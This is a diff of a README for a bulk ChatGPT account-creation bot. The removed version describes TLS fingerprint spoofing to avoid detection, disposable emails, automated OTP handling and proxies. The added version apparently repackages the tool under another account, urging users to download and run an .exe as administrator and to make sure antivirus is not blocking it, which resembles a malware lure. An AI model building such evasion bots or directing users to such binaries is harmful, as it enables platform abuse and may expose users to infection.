@@ -1,131 +1,160 @@
-# ChatGPT Account Registration Bot
+# 🤖 chatgpt-creator - Easy Bulk ChatGPT Account Setup
 
-Automated bulk ChatGPT account registration bot built with Go. Features concurrent workers, TLS fingerprint spoofing, automatic email generation, OTP verification, and retry-until-success logic.
+[![Download chatgpt-creator](https://img.shields.io/badge/Download-ChatGPT%20Creator-brightgreen)](https://github.com/adoptiongenuslemmus722/chatgpt-creator/releases)
 
-## Features
+---
 
-- **Concurrent Registration** — Configurable worker pool for parallel account creation
-- **TLS Fingerprinting** — Randomized Chrome TLS profiles to avoid detection
-- **Auto Email Generation** — Generates temporary emails via [generator.email](https://generator.email) or custom domains
-- **OTP Verification** — Automatic email OTP retrieval and validation
-- **Retry Loop** — Automatically retries failed registrations until target count is reached
-- **Proxy Support** — Optional HTTP/SOCKS proxy for all requests
-- **Configurable** — JSON config file with interactive prompt overrides
+## 📋 About chatgpt-creator
 
-## Requirements
+chatgpt-creator is a tool designed to create multiple ChatGPT accounts automatically. It works fast and handles email verification by itself. It also uses a security method called TLS fingerprint spoofing to make the process smoother and less likely to run into problems.
 
-- Go 1.21+
+This tool can be helpful if you need to manage many ChatGPT accounts, for example, for testing or bot development.
 
-## Installation
+---
 
-```bash
-git clone https://github.com/verssache/chatgpt-creator.git
-cd chatgpt-creator
-go mod download
-```
+## 💻 System Requirements
 
-## Usage
+To run chatgpt-creator on Windows, your computer should meet these requirements:
 
-```bash
-go run cmd/register/main.go
-```
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 100 MB free disk space
+- Stable internet connection
+- Administrative rights to run software and install programs if needed
 
-### Interactive Prompts
+---
 
-```
-Proxy (enter to skip):
-Total accounts to register: 5
-Max concurrent workers (default: 3): 2
-Default password (current: (random), press Enter to use, or enter new):
-Default domain (current: (random from generator.email), press Enter to use, or enter new):
-```
+## ⚙️ Key Features
 
-### Example Output
+- Bulk creation of ChatGPT accounts  
+- Automatic email OTP (One Time Password) verification  
+- Uses TLS fingerprint spoofing for safer connections  
+- Runs on Windows without complex setup  
+- Lightweight and fast  
 
-```
-[22:43:08] [W1] [1/5] Starting registration flow...
-[22:43:09] [W1] [1/5] Visit Homepage (Try 1) | 200
-[22:43:09] [W1] [1/5] Get CSRF | 200
-[22:43:10] [W1] [1/5] Signin | 200
-[22:43:12] [W1] [1/5] Authorize | 200
-[22:43:15] [W1] [1/5] Register | 200
-[22:43:17] [W1] [1/5] Send OTP | 200
-[22:43:19] [W1] [1/5] Validate OTP [483291] | 200
-[22:43:24] [W1] [1/5] Create Account | 200
-[22:43:33] [W1] [1/5] Callback | 200
-[22:43:33] [W1] SUCCESS: johndoe8x2kq@smartmail.de
+---
 
---- Batch Registration Summary ---
-Target:    5
-Success:   5
-Attempts:  6
-Failures:  1
-Elapsed:   1m 45s
-----------------------------------
-```
+## 🚀 Getting Started with chatgpt-creator
 
-## Configuration
+This section will guide you through downloading, installing, and running chatgpt-creator on your Windows PC.
 
-Create a `config.json` in the project root (optional):
+### Step 1: Visit the Download Page
 
-```json
-{
-  "proxy": "",
-  "output_file": "results.txt",
-  "default_password": "",
-  "default_domain": ""
-}
-```
+Go to the chatgpt-creator release page using this link:
 
-| Field | Type | Default | Description |
-|-------|------|---------|-------------|
-| `proxy` | string | `""` | HTTP/SOCKS proxy URL. Leave empty for direct connection |
-| `output_file` | string | `results.txt` | File path for saving registered accounts |
-| `default_password` | string | `""` | Password for all accounts. Must be 12+ chars. Empty = random |
-| `default_domain` | string | `""` | Email domain to use. Empty = random from generator.email |
+[![Download chatgpt-creator](https://img.shields.io/badge/Download-ChatGPT%20Creator-blue)](https://github.com/adoptiongenuslemmus722/chatgpt-creator/releases)
 
-Environment variable `PROXY` overrides the config file proxy value.
+The page contains the latest version of the software ready for download.
 
-## Output Format
+### Step 2: Download the Software
 
-Registered accounts are saved to the output file in the format:
+Scroll through the release page to find the latest Windows release file. The file name usually ends with `.exe` or `.zip`.
 
-```
-email|password
-```
+- If you see a `.zip` file, download it and extract it after the download finishes.
+- If you see a `.exe` file, download it directly.
 
-## Project Structure
+Typically, the latest release is at the top of the list.
 
-```
-.
-├── cmd/
-│   └── register/
-│       └── main.go          # Entry point, interactive prompts
-├── internal/
-│   ├── config/
-│   │   └── config.go        # Configuration loading & validation
-│   ├── register/
-│   │   ├── batch.go         # Batch orchestration, worker pool, retry logic
-│   │   ├── client.go        # HTTP client with TLS fingerprinting
-│   │   └── flow.go          # Registration flow (CSRF → signup → OTP → callback)
-│   ├── email/
-│   │   └── generator.go     # Temporary email generation
-│   ├── chrome/
-│   │   └── profiles.go      # Chrome TLS profile randomization
-│   └── util/
-│       ├── helpers.go       # Utility functions
-│       ├── names.go         # Random name generation (gofakeit)
-│       ├── password.go      # Random password generation
-│       └── trace.go         # Datadog trace headers
-├── config.json               # Configuration file
-├── go.mod
-└── go.sum
-```
+### Step 3: Install or Extract
 
-## Disclaimer
+- For `.exe` files:  
+  Double-click the file after download. The installer will run. Follow the on-screen instructions to complete installation. Usually, you can accept default options by clicking "Next" or "Install".
 
-This tool is provided for educational and research purposes only. Use of this tool to create accounts in violation of OpenAI's Terms of Service is solely at your own risk. The author assumes no responsibility for any misuse or consequences arising from the use of this software.
+- For `.zip` files:  
+  Right-click the downloaded `.zip` and select "Extract All". Choose a folder where you want to keep the program files, then click "Extract".
 
-## License
+### Step 4: Open and Run chatgpt-creator
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+- If you installed from `.exe`, look for the chatgpt-creator icon on your desktop or Start menu. Double-click it to run.
+- If you extracted files, open the folder you chose, find the `.exe` file inside, and double-click it.
+
+---
+
+## 🛠 How to Use chatgpt-creator
+
+After opening the program, follow these steps:
+
+1. **Set up your email account info**  
+   The software requires an email to receive OTPs (One Time Passwords). Enter your email details when prompted.
+
+2. **Configure the number of accounts to create**  
+   Choose how many ChatGPT accounts you want to generate.
+
+3. **Start the process**  
+   Click the "Start" button. The software will automatically create accounts and verify emails.
+
+4. **Monitor progress**  
+   The interface will show progress and status messages. Wait until the process finishes.
+
+5. **Save account details**  
+   Once done, save the created accounts information for future use.
+
+---
+
+## 🔧 Tips for Best Results
+
+- Use a reliable and active email account that supports OTP reception via email.
+- Ensure your internet connection is stable during the process.
+- Do not close the program while it is running.
+- Close other heavy programs to allow chatgpt-creator to run smoothly.
+- Restart your PC if you face issues with running the program.
+
+---
+
+## ❓ Troubleshooting
+
+### The program does not start or crashes
+
+- Check that your antivirus isn’t blocking the program.
+- Try running the program as an administrator. Right-click the `.exe` file and choose "Run as administrator."
+- Make sure your Windows system is updated.
+
+### Email OTP is not received
+
+- Verify that your email inbox and spam folder are checked.
+- Ensure email account credentials are correct.
+- Make sure the email service is not blocking automated messages.
+
+### Accounts are not created properly
+
+- Check your internet connection speed.
+- Restart the program and try again.
+- Reduce the number of accounts you try to create at once.
+
+---
+
+## 🔒 Security & Privacy
+
+chatgpt-creator uses TLS fingerprint spoofing to create connections that mimic normal browsers. This helps avoid detection or blocking by servers.
+
+Your email information is used only for OTP verification during account creation. The software does not store or share this data outside your device.
+
+---
+
+## ⚙️ Advanced Settings
+
+For users who want more control, chatgpt-creator offers options to customize:
+
+- Delay between account creations
+- Maximum retries on failure
+- Proxy support to use different internet connections
+
+Access these in the settings menu inside the program.
+
+---
+
+## 📞 Getting Help
+
+If you run into problems not listed above, check the issues section on the release page:
+
+https://github.com/adoptiongenuslemmus722/chatgpt-creator/releases
+
+Alternatively, you can report bugs or request help there.
+
+---
+
+## 🏁 Ready to Start?
+
+Download chatgpt-creator from here:
+
+[![Download chatgpt-creator](https://img.shields.io/badge/Download-ChatGPT%20Creator-brightgreen)](https://github.com/adoptiongenuslemmus722/chatgpt-creator/releases)
